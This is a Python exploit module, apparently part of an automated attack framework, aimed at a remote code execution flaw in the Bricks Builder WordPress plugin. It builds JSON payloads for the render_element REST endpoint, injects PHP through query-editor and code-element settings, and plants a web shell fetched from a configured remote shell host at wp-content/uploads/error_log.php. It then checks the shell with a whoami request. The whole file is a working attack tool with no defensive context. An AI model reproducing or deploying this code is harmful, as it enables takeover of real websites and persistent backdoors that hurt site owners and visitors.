
import importlib
from pathlib import Path
import re, json
NO_USED = None

RE_Helper = importlib.import_module('Core.Core_Helper')

GEN_SHELL = importlib.import_module('Core.Shell_Loader')

with open(r"Config/config.json", "r") as f:
    config_json = json.load(f)
CFG_HOSTSHELL = config_json['URLs']['HOST_WebShell']



class Exploit_Brick:
    def __init__(self, Target, Proxies=NO_USED, Re_Nonce=NO_USED, End_Point=False, UserAgent=NO_USED):
        self.SET_Timeout = 30 if Proxies else 10
        
        #Re_Nonce = NO_USED if Re_Nonce else Re_Nonce 
        self.Target = Target
        self.Proxies_ON = Proxies
        self.Shell_Inj_ = GEN_SHELL.Generate_EVIL(
                                    METHOD_PAYLOAD=GEN_SHELL.METHODS[3], 
                                    URL_SHELL=CFG_HOSTSHELL, 
                                    FILENAME_SHELL='wp-content/uploads/error_log.php',
                                    ).Shell_Generated()
        self.Command_ = 'whoami'
        
        # self.ROOT_X = Path(__file__).resolve().parents[1]
        self.json_data = NO_USED
        self.payload_type = 'code'
        self.Vuln_Pointed = End_Point  
        self.WPNonce = Re_Nonce
        self.post_ID = 1
        self.UserAgent = UserAgent


    def Grab_Nonce(self):
        
        try:
            
            Req_2hundred = RE_Helper.Threaded_GET(
                                                self.TARGET, 
                                                NO_USED, 
                                                self.SET_Timeout, 
                                                self.UserAgent, 
                                                NO_USED, 
                                                NO_USED,
                                                NO_USED,
                                                'req_get',
                                                self.Proxies,
                                                NO_USED)
            ROCK_LEET = Req_2hundred.run()
            RES_PAGE = [ROCK_LEET[i] for i in ROCK_LEET][0]
            FoundORNot = RE_Helper.Extract_WPNonce(RES_PAGE['resp'].text)
            if FoundORNot:
                return FoundORNot
            

            return None
            
            

        except:pass 
    
    

    def Exploiter(self): 
        
        try:
            #self.WPNonce = self.Grab_Nonce()
            
            if self.WPNonce:
                
                
                payload_command = f'throw new Exception(`{self.Shell_Inj_}` . "END");'

                base_element = {
                    "postId": self.post_ID,
                    "nonce": self.WPNonce,
                }

                query_settings = {
                    "useQueryEditor": True,
                    "queryEditor": payload_command,
                }

                payload_templates = {
                    "carousel": {
                        **base_element,
                        "element": {
                            "name": "carousel",
                            "settings": {"type": "posts", "query": query_settings},
                        },
                    },
                    "container": {
                        **base_element,
                        "element": {
                            "name": "container",
                            "settings": {"hasLoop": "true", "query": query_settings},
                        },
                    },
                    "generic": {
                        **base_element,
                        "element": "1",
                        "loopElement": {
                            "settings": {"query": query_settings},
                        },
                    },
                    "code": {
                        **base_element,
                        "element": {
                            "name": "code",
                            "settings": {
                                "executeCode": "true",
                                "code": f"<?php {payload_command} ?>",
                            },
                        },
                    },
                }

                FORM_JSON = payload_templates[self.payload_type]
                
                if self.Vuln_Pointed:
                    p_Vuln = f"wp-json/bricks/v1/render_element"
                else:
                    p_Vuln = f"?rest_route=/bricks/v1/render_element"
                
              

                POST_EXEC = RE_Helper.Threaded_POST(
                                                    CFG_DOMAIN=self.Target, 
                                                    CFG_VULN=p_Vuln,
                                                    CFG_TIMEOUT=self.SET_Timeout,

                                                    CFG_USERAGENT = {"User-Agent": self.UserAgent, "Content-Type": "application/json"} ,
                                                    
                                                    CFG_DATA=json.dumps(FORM_JSON),
                                                    CFG_FILE_UPLOAD=NO_USED, 
                                                    CFG_RAW_BODY=NO_USED, 
                                                    CFG_DELAY_ATTACK=0, 
                                                    CFG_MODE='post_form', 
                                                    SET_REDIRECT=NO_USED,
                                                    CFG_Proxies=self.Proxies_ON,
                                                    Mem_Sess=NO_USED
                                               
                                                 )
                
                RESP_DATA = POST_EXEC.run()
                
                
                EXP_RES = [RESP_DATA[i] for i in RESP_DATA][0]
                if EXP_RES['resp'].text:
                    
              
                    RZ_SH3LL = RE_Helper.Func_ValidShell(self.SET_Timeout, self.Proxies_ON, f'{self.Target}/wp-content/uploads/error_log.php?whoami=@1337', self.UserAgent)
                    if RZ_SH3LL:
                        RE_Helper.Printed_Value.Log_Success(self.Target, '[PLUGIN] Bricks_RCE | Weclome SHELL')
                    else:
                        
                        return True
                else:
                    RE_Helper.Printed_Value.Log_Fail(EXP_RES['domain'], f"[PLUGIN] Bricks_RCE | Failed")

            else:
                RE_Helper.Printed_Value.Log_Fail(EXP_RES['domain'], f"[PLUGIN] Bricks_RCE | Failed")  
        except:pass 
            #RE_Helper.Printed_Value.Log_Error('Error Exploiter Brick', f"{e}")    
   
  
#Target, Proxies, Sess, WPNonce, UserAgent, PLUGIN_CONTROL_SYSTEM, FOUND_CMS
def Plugin_BurnWP(Target, Proxies, RE_SESS, WP_NONCE, UserAgent, PLUGIN_CONTROL_SYSTEM, FOUND_CMS):
     
    try:
        
        #End_Point trick instead WPNonce in here
        #End_Point = True
        if PLUGIN_CONTROL_SYSTEM['C_WordPress'] and FOUND_CMS == 'WORDPRESS':

            Runner_Exploit = Exploit_Brick(Target, Proxies, WP_NONCE, False, UserAgent)
            Runner_Exploit.Exploiter()

        return
        
    except:pass 
        #RE_Helper.Printed_Value.Log_Error('Error Bricks', f"{er}")  

